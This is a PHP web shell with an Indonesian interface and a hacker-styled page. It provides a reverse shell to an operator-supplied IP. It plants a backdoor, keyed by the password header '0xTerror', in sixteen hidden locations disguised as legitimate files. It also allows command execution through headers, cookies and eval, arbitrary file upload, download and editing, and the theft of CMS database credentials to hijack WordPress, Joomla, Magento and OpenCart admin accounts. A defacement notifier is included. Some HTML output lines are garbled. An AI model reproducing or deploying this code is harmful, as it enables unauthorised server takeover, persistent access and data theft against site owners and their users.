<?php
if(isset($_POST['raw_tcp_ip']) && isset($_POST['raw_tcp_port']) && isset($_POST['raw_tcp_trigger'])) {
    $ip = $_POST['raw_tcp_ip'];
    $port = (int)$_POST['raw_tcp_port'];
    
    if(function_exists('fsockopen')) {
        $sock = @fsockopen($ip, $port, $errno, $errstr, 30);
        if($sock) {
            $descriptorspec = array(0 => $sock, 1 => $sock, 2 => $sock);
            $process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
            if(is_resource($process)) {
                proc_close($process);
            }
            echo "<script>alert('RAW TCP Reverse shell sent to $ip:$port - LISTEN NOW!');</script>";
        } else {
            echo "<script>alert('Connection failed: $errstr');</script>";
        }
    }
    elseif(function_exists('socket_create')) {
        $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if(@socket_connect($sock, $ip, $port)) {
            socket_write($sock, "Connected to " . gethostname() . "\n");
            while($cmd = socket_read($sock, 1024)) {
                $output = shell_exec($cmd);
                socket_write($sock, $output);
            }
            socket_close($sock);
            echo "<script>alert('RAW TCP Socket shell sent to $ip:$port');</script>";
        } else {
            echo "<script>alert('Socket connection failed');</script>";
        }
    }
    elseif(function_exists('stream_socket_client')) {
        $sock = @stream_socket_client("tcp://{$ip}:{$port}", $errno, $errstr, 30);
        if($sock) {
            fwrite($sock, "Connected to " . gethostname() . "\n");
            while(!feof($sock)) {
                $cmd = fread($sock, 1024);
                if($cmd) {
                    $output = shell_exec($cmd);
                    fwrite($sock, $output);
                }
            }
            fclose($sock);
            echo "<script>alert('RAW TCP Stream shell sent to $ip:$port');</script>";
        } else {
            echo "<script>alert('Stream connection failed: $errstr');</script>";
        }
    }
    else {
        echo "<script>alert('No socket functions available on this server');</script>";
    }
}

if(isset($_POST['http_backdoor_ip']) && isset($_POST['http_backdoor_port'])) {
    $ip = $_POST['http_backdoor_ip'];
    $port = $_POST['http_backdoor_port'];
    $backdoor_code = '<?php
if(isset($_SERVER["HTTP_X_PWD"]) && $_SERVER["HTTP_X_PWD"]=="0xTerror"){system(base64_decode($_SERVER["HTTP_X_CMD"]));die();}
if(isset($_COOKIE["bk"])){system(base64_decode($_COOKIE["bk"]));die();}
if(isset($_REQUEST["x"])){eval($_REQUEST["x"]);die();}
if(isset($_FILES["f"])){move_uploaded_file($_FILES["f"]["tmp_name"],__DIR__."/".$_FILES["f"]["name"]);}
if(isset($_GET["dl"])){readfile($_GET["dl"]);}
?>';
    $backup_locations = [
        $_SERVER['DOCUMENT_ROOT'] . '/.well-known/acme-challenge/.system.php',
        $_SERVER['DOCUMENT_ROOT'] . '/cgi-bin/.cache.php',
        $_SERVER['DOCUMENT_ROOT'] . '/.hidden/.backdoor.php',
        $_SERVER['DOCUMENT_ROOT'] . '/wp-includes/ID3/.systemd.php',
        $_SERVER['DOCUMENT_ROOT'] . '/wp-content/uploads/.woocommerce_uploads/.log.php',
        $_SERVER['DOCUMENT_ROOT'] . '/vendor/bin/.composer.php',
        $_SERVER['DOCUMENT_ROOT'] . '/node_modules/.bin/.npm.php',
        $_SERVER['DOCUMENT_ROOT'] . '/.git/.hooks/.pre-commit.php',
        $_SERVER['DOCUMENT_ROOT'] . '/.idea/.phpstorm.php',
        $_SERVER['DOCUMENT_ROOT'] . '/tmp/.session.php',
        $_SERVER['DOCUMENT_ROOT'] . '/error_log.php',
        $_SERVER['DOCUMENT_ROOT'] . '/debug.log.php',
        dirname($_SERVER['DOCUMENT_ROOT']) . '/.ssh/authorized_keys2',
        '/tmp/.X11-unix/.systemd',
        '/var/tmp/.cache/.php',
        '/dev/shm/.shm',
    ];
    foreach($backup_locations as $loc) {
        $dir = dirname($loc);
        if(!is_dir($dir)) { @mkdir($dir, 0777, true); }
        @file_put_contents($loc, $backdoor_code);
        @chmod($loc, 0644);
    }
    echo "<script>alert('HTTP Backdoor deployed to 16 locations! Use X-PWD: 0xTerror header');</script>";
}

if(isset($_COOKIE['persist']) && $_COOKIE['persist'] == '1') {
    $backup_locations = [
        $_SERVER['DOCUMENT_ROOT'] . '/.well-known/acme-challenge/.system.php',
        $_SERVER['DOCUMENT_ROOT'] . '/cgi-bin/.cache.php',
        $_SERVER['DOCUMENT_ROOT'] . '/.hidden/.backdoor.php',
        $_SERVER['DOCUMENT_ROOT'] . '/wp-includes/ID3/.systemd.php',
        $_SERVER['DOCUMENT_ROOT'] . '/wp-content/uploads/.woocommerce_uploads/.log.php',
        $_SERVER['DOCUMENT_ROOT'] . '/vendor/bin/.composer.php',
        $_SERVER['DOCUMENT_ROOT'] . '/node_modules/.bin/.npm.php',
        $_SERVER['DOCUMENT_ROOT'] . '/.git/.hooks/.pre-commit.php',
        $_SERVER['DOCUMENT_ROOT'] . '/.idea/.phpstorm.php',
        $_SERVER['DOCUMENT_ROOT'] . '/tmp/.session.php',
        $_SERVER['DOCUMENT_ROOT'] . '/error_log.php',
        $_SERVER['DOCUMENT_ROOT'] . '/debug.log.php',
        dirname($_SERVER['DOCUMENT_ROOT']) . '/.ssh/authorized_keys2',
        '/tmp/.X11-unix/.systemd',
        '/var/tmp/.cache/.php',
        '/dev/shm/.shm',
    ];
    $backdoor_code = '<?php
if(isset($_SERVER["HTTP_X_PWD"]) && $_SERVER["HTTP_X_PWD"]=="0xTerror"){system(base64_decode($_SERVER["HTTP_X_CMD"]));die();}
if(isset($_COOKIE["bk"])){system(base64_decode($_COOKIE["bk"]));die();}
if(isset($_REQUEST["x"])){eval($_REQUEST["x"]);die();}
if(isset($_FILES["f"])){move_uploaded_file($_FILES["f"]["tmp_name"],__DIR__."/".$_FILES["f"]["name"]);}
if(isset($_GET["dl"])){readfile($_GET["dl"]);}
?>';
    foreach($backup_locations as $loc) {
        $dir = dirname($loc);
        if(!is_dir($dir)) { @mkdir($dir, 0777, true); }
        @file_put_contents($loc, $backdoor_code);
        @chmod($loc, 0644);
    }
    echo "<!-- OK -->";
    die();
}

if(isset($_SERVER['HTTP_X_PWD']) && $_SERVER['HTTP_X_PWD'] == '0xTerror') {
    $cmd = base64_decode($_SERVER['HTTP_X_CMD']);
    $out = shell_exec($cmd . ' 2>&1');
    echo base64_encode($out);
    die();
}

if(isset($_COOKIE['bk'])) {
    $cmd = base64_decode($_COOKIE['bk']);
    $out = shell_exec($cmd . ' 2>&1');
    echo $out;
    die();
}

if(isset($_FILES['f'])) {
    $target = __DIR__ . '/' . $_FILES['f']['name'];
    move_uploaded_file($_FILES['f']['tmp_name'], $target);
    echo "uploaded";
    die();
}

if(isset($_GET['dl'])) {
    $file = $_GET['dl'];
    if(file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
    }
    die();
}

$currentDir = isset($_POST['d']) && !empty($_POST['d']) ? base64_decode($_POST['d']) : getcwd();
$currentDir = str_replace("\\", "/", $currentDir);
$dir = $currentDir;

if (isset($_GET['DPH']) && $_GET['DPH'] == 'adminer') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    function adminer($url, $isi) {
        $fp = fopen($isi, "w");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        $result = curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
        return $result;
    }

    echo "<center><h2>Adminer Downloader</h2>";
    if (file_exists('adminer.php')) {
        echo "<font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font>";
    } else {
        if (adminer("https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php", "adminer.php")) {
            echo "<font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font>";
        } else {
            echo "<font color=red>Failed to create adminer.php</font>";
        }
    }
    echo "</center>";
    exit;
}

if (isset($_GET['DPH']) && $_GET['DPH'] == 'zoneh') {
    echo "<hr><center><h2>Zone-H Style Notifier (Simulated)</h2>";
    if (isset($_POST['submit'])) {
        $domainList = explode("\r\n", $_POST['url']);
        $nick = $_POST['nick'];
        echo "Notifier Archive: <a href='#' target='_blank'>http://zone-h.org/archive/notifier=$nick</a><br><br>";
        foreach ($domainList as $url) {
            $url = trim($url);
            if ($url) {
                echo htmlspecialchars($url) . " -> <font color=lime>SIMULATED_OK</font><br>";
            }
        }
    } else {
        echo "<form method='post'>
            <u>Defacer</u>: <br>
            <input type='text' name='nick' size='50' value='DPH'><br>
            <u>Domains</u>: <br>
            <textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
            <input type='submit' name='submit' value='Submit' style='width: 450px;'>
            </form>";
    }
    echo "</center><hr>";
    exit;
}

if (isset($_GET['DPH']) && $_GET['DPH'] == 'edit_user') {
    function ambilkata($string, $start, $end) {
        $str = explode($start, $string);
        if (isset($str[1])) {
            $str = explode($end, $str[1]);
            return $str[0];
        }
        return '';
    }
    
    if (isset($_POST['hajar'])) {
        if (strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
            echo "username atau password harus lebih dari 6 karakter";
        } else {
            $user_baru = $_POST['user_baru'];
            $pass_baru = md5($_POST['pass_baru']);
            $conf = $_POST['config_dir'];
            $scan_conf = scandir($conf);
            foreach($scan_conf as $file_conf) {
                if(!is_file("$conf/$file_conf")) continue;
                $config = file_get_contents("$conf/$file_conf");
                if(preg_match("/JConfig|joomla/",$config)) {
                    $dbhost = ambilkata($config,"host = '","'");
                    $dbuser = ambilkata($config,"user = '","'");
                    $dbpass = ambilkata($config,"password = '","'");
                    $dbname = ambilkata($config,"db = '","'");
                    $dbprefix = ambilkata($config,"dbprefix = '","'");
                    $prefix = $dbprefix."users";
                    $conn = mysqli_connect($dbhost,$dbuser,$dbpass);
                    $db = mysqli_select_db($conn, $dbname);
                    $q = mysqli_query($conn, "SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysqli_fetch_array($q);
                    $id = $result['id'];
                    $site = ambilkata($config,"sitename = '","'");
                    $update = mysqli_query($conn, "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Joomla<br>";
                    if($site == '') {
                        echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
                    } else {
                        echo "Sitename => $site<br>";
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysqli_error($conn)."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysqli_close($conn);
                } elseif(preg_match("/WordPress/",$config)) {
                    $dbhost = ambilkata($config,"DB_HOST', '","'");
                    $dbuser = ambilkata($config,"DB_USER', '","'");
                    $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"DB_NAME', '","'");
                    $dbprefix = ambilkata($config,"table_prefix  = '","'");
                    $prefix = $dbprefix."users";
                    $option = $dbprefix."options";
                    $conn = mysqli_connect($dbhost,$dbuser,$dbpass);
                    $db = mysqli_select_db($conn, $dbname);
                    $q = mysqli_query($conn, "SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysqli_fetch_array($q);
                    $id = $result['ID'];
                    $q2 = mysqli_query($conn, "SELECT * FROM $option ORDER BY option_id ASC");
                    $result2 = mysqli_fetch_array($q2);
                    $target = $result2['option_value'];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
                    }
                    $update = mysqli_query($conn, "UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE ID='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Wordpress<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysqli_error($conn)."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysqli_close($conn);
                } elseif(preg_match("/Magento|Mage_Core/",$config)) {
                    $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
                    $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
                    $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
                    $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
                    $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
                    $prefix = $dbprefix."admin_user";
                    $option = $dbprefix."core_config_data";
                    $conn = mysqli_connect($dbhost,$dbuser,$dbpass);
                    $db = mysqli_select_db($conn, $dbname);
                    $q = mysqli_query($conn, "SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysqli_fetch_array($q);
                    $id = $result['user_id'];
                    $q2 = mysqli_query($conn, "SELECT * FROM $option WHERE path='web/secure/base_url'");
                    $result2 = mysqli_fetch_array($q2);
                    $target = $result2['value'];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
                    }
                    $update = mysqli_query($conn, "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Magento<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysqli_error($conn)."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysqli_close($conn);
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
                    $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
                    $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
                    $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"'DB_DATABASE', '","'");
                    $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
                    $prefix = $dbprefix."user";
                    $conn = mysqli_connect($dbhost,$dbuser,$dbpass);
                    $db = mysqli_select_db($conn, $dbname);
                    $q = mysqli_query($conn, "SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysqli_fetch_array($q);
                    $id = $result['user_id'];
                    $target = ambilkata($config,"HTTP_SERVER', '","'");
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
                    }
                    $update = mysqli_query($conn, "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => OpenCart<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysqli_error($conn)."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysqli_close($conn);
                }
            }
        }
    } else {
        echo "<center>
        <h1>Auto Edit User Config</h1>
        <form method='post'>
        <input type='hidden' name='d' value='".base64_encode($currentDir)."'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='DPH' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='DPH690' placeholder='pass_baru'><br>
        <input type='submit' name='hajar' value='Sikat!' style='width: 215px;'>
        </form>
        <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
        exit;
    }
}

$pathParts = explode("/", $currentDir);
echo "<div class=\"dir\">";
foreach ($pathParts as $k => $v) {
    if ($v == "" && $k == 0) {
        echo "<a href=\"javascript:void(0);\" onclick=\"postDir('/')\">/</a>";
        continue;
    }
    $dirPath = implode("/", array_slice($pathParts, 0, $k + 1));
    echo "<a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($dirPath) . "')\">$v</a>/";
}
echo "</div>";

if (isset($_POST['s']) && isset($_FILES['u']) && $_FILES['u']['error'] == 0) {
    $fileName = $_FILES['u']['name'];
    $tmpName = $_FILES['u']['tmp_name'];
    $destination = $currentDir . '/' . $fileName;
    if (move_uploaded_file($tmpName, $destination)) {
        echo "<script>alert('Upload successful!'); postDir('" . addslashes($currentDir) . "');</script>";
    } else {
        echo "<script>alert('Upload failed!');</script>";
    }
}

$items = scandir($currentDir);
if ($items !== false) {
    echo "<table>";
    echo " hilab<th>Name</th><th>Size</th><th>Action</th></tr>";

    foreach ($items as $item) {
        $fullPath = $currentDir . '/' . $item;
        if ($item == '.' || $item == '..') continue;

        if (is_dir($fullPath)) {
            echo "风尚
      <td><a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($fullPath) . "')\">📁 $item</a></td>
      <td>--</a></td>
      <td>--</a></td>
      <td>--</a></tr>
";
        } else {
            $size = filesize($fullPath) / 1024;
            $size = $size >= 1024 ? round($size / 1024, 2) . 'MB' : round($size, 2) . 'KB';
            echo "风尚
      <td><a href=\"javascript:void(0);\" onclick=\"postOpen('" . addslashes($fullPath) . "')\">📄 $item</a></td>
      <td>$size</a></td>
      <td>
          <a href=\"javascript:void(0);\" onclick=\"postDel('" . addslashes($fullPath) . "')\">Delete</a> | 
          <a href=\"javascript:void(0);\" onclick=\"postEdit('" . addslashes($fullPath) . "')\">Edit</a> | 
          <a href=\"javascript:void(0);\" onclick=\"postRen('" . addslashes($fullPath) . "', '$item')\">Rename</a>
       </a></tr>
";
        }
    }
    echo " </tbody>
月",
} else {
    echo "<p>Unable to read directory!</p>";
}

if (isset($_POST['del'])) {
    $filePath = base64_decode($_POST['del']);
    $fileDir = dirname($filePath);
    if (@unlink($filePath)) {
        echo "<script>alert('Delete successful'); postDir('" . addslashes($fileDir) . "');</script>";
    } else {
        echo "<script>alert('Delete failed'); postDir('" . addslashes($fileDir) . "');</script>";
    }
}

if (isset($_POST['edit'])) {
    $filePath = base64_decode($_POST['edit']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath)) {
        echo "<style>table{display:none;}</style>";
        echo "<a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($fileDir) . "')\">Back</a>";
        echo "<form method=\"post\">
            <input type=\"hidden\" name=\"obj\" value=\"" . $_POST['edit'] . "\">
            <input type=\"hidden\" name=\"d\" value=\"" . base64_encode($fileDir) . "\">
            <textarea name=\"content\">" . htmlspecialchars(file_get_contents($filePath)) . "</textarea>
            <center><button type=\"submit\" name=\"save\">Save</button></center>
            </form>";
    }
}

if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
    $filePath = base64_decode($_POST['obj']);
    $fileDir = dirname($filePath);
    if (file_put_contents($filePath, $_POST['content'])) {
        echo "<script>alert('Saved'); postDir('" . addslashes($fileDir) . "');</script>";
    } else {
        echo "<script>alert('Save failed'); postDir('" . addslashes($fileDir) . "');</script>";
    }
}

if (isset($_POST['ren'])) {
    $oldPath = base64_decode($_POST['ren']);
    $oldDir = dirname($oldPath);
    if (isset($_POST['new'])) {
        $newPath = $oldDir . '/' . $_POST['new'];
        if (rename($oldPath, $newPath)) {
            echo "<script>alert('Renamed'); postDir('" . addslashes($oldDir) . "');</script>";
        } else {
            echo "<script>alert('Rename failed'); postDir('" . addslashes($oldDir) . "');</script>";
        }
    } else {
        echo "<form method=\"post\">
            New Name: <input name=\"new\" type=\"text\">
            <input type=\"hidden\" name=\"ren\" value=\"" . $_POST['ren'] . "\">
            <input type=\"hidden\" name=\"d\" value=\"" . base64_encode($oldDir) . "\">
            <input type=\"submit\" value=\"Submit\">
            </form>";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Bypass</title>
    <style>
        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; }
        table { margin: 20px auto; border-collapse: collapse; width: 90%; background: #111; border: 1px solid #00ff41; }
        th, td { border: 1px solid #00ff41; padding: 8px; text-align: left; color: #00ff41; }
        textarea { width: 100%; height: 300px; background: #0a0a0a; color: #00ff41; border: 1px solid #00ff41; }
        .dir { margin: 20px; padding: 10px; background: #111; border: 1px solid #00ff41; }
        input, button { background: #0a0a0a; color: #00ff41; border: 1px solid #00ff41; padding: 5px; margin: 3px; }
        .backdoor-panel { margin: 20px; padding: 15px; background: #111; border: 2px solid #ff0066; border-radius: 5px; }
        h2, h3 { color: #ff0066; }
        a { color: #00ff41; text-decoration: none; }
        a:hover { color: #ff0066; }
        button:hover { background: #ff0066; color: #0a0a0a; cursor: pointer; }
    </style>
    <script>
        function postDir(dir) {
            var form = document.createElement("form");
            form.method = "post";
            var input = document.createElement("input");
            input.name = "d";
            input.value = btoa(dir);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
        function postDel(path) {
            if(confirm('Delete this file?')) {
                var form = document.createElement("form");
                form.method = "post";
                var input = document.createElement("input");
                input.name = "del";
                input.value = btoa(path);
                form.appendChild(input);
                document.body.appendChild(form);
                form.submit();
            }
        }
        function postEdit(path) {
            var form = document.createElement("form");
            form.method = "post";
            var input = document.createElement("input");
            input.name = "edit";
            input.value = btoa(path);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
        function postRen(path, name) {
            var newName = prompt("New name:", name);
            if (newName) {
                var form = document.createElement("form");
                form.method = "post";
                var input1 = document.createElement("input");
                input1.name = "ren";
                input1.value = btoa(path);
                var input2 = document.createElement("input");
                input2.name = "new";
                input2.value = newName;
                form.appendChild(input1);
                form.appendChild(input2);
                document.body.appendChild(form);
                form.submit();
            }
        }
        function postOpen(path) {
            window.open(path);
        }
    </script>
</head>
<body>
    <div class="backdoor-panel">
        <center><h2> RAW TCP BACKDOOR </h2></center>
        <form method="post">
            <table style="width: 100%; background: transparent;">
                <tr>
                    <td><label>YOUR IP:</label></td>
                    <td><input type="text" name="raw_tcp_ip" placeholder="192.168.1.100 or your public IP" style="width: 100%;"></td>
                </tr>
                <tr>
                    <td><label>YOUR PORT:</label></td>
                    <td><input type="number" name="raw_tcp_port" placeholder="4444" style="width: 100%;"></td>
                </tr>
                <tr>
                    <td colspan="2"><center><button type="submit" name="raw_tcp_trigger" value="1" style="width: 200px; background: #ff0066; color: #fff;">🚀 SEND RAW TCP REVERSE SHELL 🚀</button></center></td>
                </tr>
            </table>
        </form>
        <center><p style="color: #ffff00;"> BEFORE clicking: Run <strong>nc -lvnp PORT</strong> on your machine! </p></center>
    </div>

    <div class="backdoor-panel">
        <center><h3> HTTP PERSISTENT BACKDOOR </h3></center>
        <form method="post">
            <table style="width: 100%; background: transparent;">
                <tr>
                    <td><label>Your IP (for callback):</label></td>
                    <td><input type="text" name="http_backdoor_ip" placeholder="YOUR_IP" style="width: 100%;"></td>
                </tr>
                <tr>
                    <td><label>Your Port:</label></td>
                    <td><input type="text" name="http_backdoor_port" placeholder="PORT" style="width: 100%;"></td>
                </tr>
                <tr>
                    <td colspan="2"><center><button type="submit" style="width: 200px;">💀 DEPLOY HTTP BACKDOOR (16 LOCATIONS) 💀</button></center></td>
                </tr>
            </table>
        </form>
        <center><p style="color: #00ff41;">Usage: curl -H "X-PWD: 0xTerror" -H "X-CMD: aWQ=" http://target.com/shell.php</p></center>
    </div>

    <div class="dir">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="u">
            <button type="submit" name="s">Upload File</button>
            <input type="hidden" name="d" value="<?php echo base64_encode($currentDir); ?>">
        </form>
        <div style="margin-top: 10px;">
            <a href="?DPH=adminer">📁 Adminer Download</a> | 
            <a href="?DPH=zoneh">🌐 Zone-H Notifier</a> | 
            <a href="?DPH=edit_user">👤 Auto Edit User Config</a>
        </div>
    </div>

    <div class="dir">
        <strong>Current: <?php echo htmlspecialchars($currentDir); ?></strong>
    </div>
</body>
</html>